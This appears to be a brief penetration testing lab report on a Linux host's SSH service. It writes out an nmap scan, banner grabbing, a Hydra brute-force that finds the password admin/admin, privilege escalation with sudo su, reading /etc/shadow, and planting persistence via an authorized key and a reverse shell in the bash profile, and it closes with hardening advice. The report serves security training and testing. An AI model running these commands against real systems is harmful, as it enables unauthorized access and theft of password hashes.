# Penetration Testing Report – (Port 22 - SSH)

# 1.Test date : 12-06-25
  Test by : [ NIKHIL ]

2. Target Information
- Target IP: 192.168.1.101
- Operating System: Linux (Ubuntu-based)
- Service: SSH (OpenSSH)
- Port: 22/tcp
- Tools Used: Nmap, Hydra, Metasploit, SSH client


# 3 Scanning / Reconnaissance
Command:
```
nmap -sV -p 22 192.168.1.101
```
Output:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

Interpretation:
The SSH service is running an outdated version (OpenSSH 4.7p1), which may be vulnerable to known issues.  
No immediate remote exploit is available, but weak password authentication can be tested.  

#4. Enumeration

**4.1 Banner Grabbing**
```
nc 192.168.1.101 22
telnet 192.168.1.101 22
```
Result:
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

**4.2 Username Discovery**
Possible usernames:
- root
- admin
- user
- postgres
- service

Gathered from:
- Machine default users
- /etc/passwd (via other exploits)

**Ecryption Enumrations**
```
 ssh-client 192.168.1.101
```
It will so the Cryptographic info 
# 5. Exploitation

**5.1 Brute-Force Attack [Hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/)**

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
```
Commands : -l/L  known/unknown with user-list , -p/P known/unknown with pass-list
Result:
[22][ssh] host: 192.168.1.101   login: admin   password: admin

5.2 Manual SSH Login
Command:
ssh admin@192.168.1.101

Result:
- Successful login
- User shell obtained

**Privilege Escalation**
- Tried `sudo -l`
- Password for `admin` is same as username
- Escalated to root using `sudo su`

6. Post-Exploitation

Commands executed:
- whoami → root
- uname -a → kernel info
- ifconfig → network details
- cat /etc/shadow → password hashes

Persistence:
- Created SSH key in `~/.ssh/authorized_keys`
- Added reverse shell to bash profile

7. Recommendations

- Update OpenSSH to the latest stable version
- Disable root and default user login via SSH
- Use key-based authentication instead of passwords
- Implement fail2ban or similar tools to prevent brute-force
- Audit SSH logs for unauthorized login attempts
- Enforce strong password policies

8. Conclusion

Port 22 (SSH) on 192.168.1.101 was vulnerable due to weak default credentials and lack of brute-force protection.   
Successful login and privilege escalation to root were achieved using Hydra and default credentials.  
Hardening SSH and disabling unused accounts are essential to prevent real-world attacks.
